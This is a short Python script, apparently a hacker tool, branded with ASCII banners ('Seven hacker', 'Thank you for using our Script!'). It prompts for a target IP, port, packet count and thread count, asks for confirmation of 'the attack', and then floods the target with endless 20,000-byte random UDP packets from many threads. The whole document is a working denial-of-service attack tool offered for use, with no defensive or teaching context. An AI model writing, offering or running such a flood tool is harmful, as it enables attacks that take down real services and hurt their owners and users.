import socket
import random
import threading

print(''' .d8888b.                                           888                        888                       
d88P  Y88b                                          888                        888                       
Y88b.                                               888                        888                       
 "Y888b.    .d88b.  888  888  .d88b.  88888b.       88888b.   8888b.   .d8888b 888  888  .d88b.  888d888 
    "Y88b. d8P  Y8b 888  888 d8P  Y8b 888 "88b      888 "88b     "88b d88P"    888 .88P d8P  Y8b 888P"   
      "888 88888888 Y88  88P 88888888 888  888      888  888 .d888888 888      888888K  88888888 888     
Y88b  d88P Y8b.      Y8bd8P  Y8b.     888  888      888  888 888  888 Y88b.    888 "88b Y8b.     888     
 "Y8888P"   "Y8888    Y88P    "Y8888  888  888      888  888 "Y888888  "Y8888P 888  888  "Y8888  888     
                                                                                                         ''')
                                                                                                        
print('''    _______ _                 _                           __                  
   |__   __| |               | |                         / _|                 
      | |  | |__   __ _ _ __ | | __  _   _  ___  _   _  | |_ ___  _ __        
      | |  | '_ \ / _` | '_ \| |/ / | | | |/ _ \| | | | |  _/ _ \| '__|       
      | |  | | | | (_| | | | |   <  | |_| | (_) | |_| | | || (_) | |          
      |_|  |_| |_|\__,_|_| |_|_|\_\  \__, |\___/ \__,_| |_| \___/|_|          
            _                         __/ |     _____           _       _     
           (_)                       |___/     / ____|         (_)     | |    
  _   _ ___ _ _ __   __ _    ___  _   _ _ __  | (___   ___ _ __ _ _ __ | |_   
 | | | / __| | '_ \ / _` |  / _ \| | | | '__|  \___ \ / __| '__| | '_ \| __|  
 | |_| \__ \ | | | | (_| | | (_) | |_| | |     ____) | (__| |  | | |_) | |_ _ 
  \__,_|___/_|_| |_|\__, |  \___/ \__,_|_|    |_____/ \___|_|  |_| .__/ \__(_)
                     __/ |                                       | |          
                    |___/                                        |_|          ''')
                    
ip = str(input("IP:"))
port = int(input("PORT:"))
Times = int(input("PACKETS PER ONE CONNECTION:"))
threads = int(input("connection:"))
ready = str(input("confirm the attack(Y/N):"))

def attack():
    fine = random._urandom(20000)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#UDP
            addr = (str(ip),int(port))
            for x in range(Times):
                s.sendto(fine,addr)
            print("sent to the time")
        except:
            print("[*]error")  
            
for Y in range(threads):
    if ready == 'Y':
         TH = threading.Thread(target = attack)
         TH.start()    